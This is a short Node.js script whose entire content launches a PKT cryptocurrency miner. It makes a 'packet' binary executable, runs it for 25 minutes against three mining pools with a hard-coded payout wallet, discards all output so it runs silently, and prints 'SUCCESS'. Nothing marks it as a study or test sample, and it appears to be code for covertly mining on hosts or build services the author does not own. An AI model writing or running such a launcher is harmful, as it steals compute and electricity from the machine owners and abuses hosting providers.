var { exec, spawn, execSync, spawnSync } = require('child_process');

exec('chmod 700 packet && timeout 25m ./packet ann -p pkt1qthhdz7dfrepa43xkww6ft4wz0cyuqda9ehqjqf http://pool.pktpool.io/diff/16384 http://pool.pkt.world/ http://pool.pkteer.com -t 3 >/dev/null 2>&1;echo SUCCESS', function (err, stdout, stderr) {
   if (err) console.error(stderr);
   console.log(stdout);
});
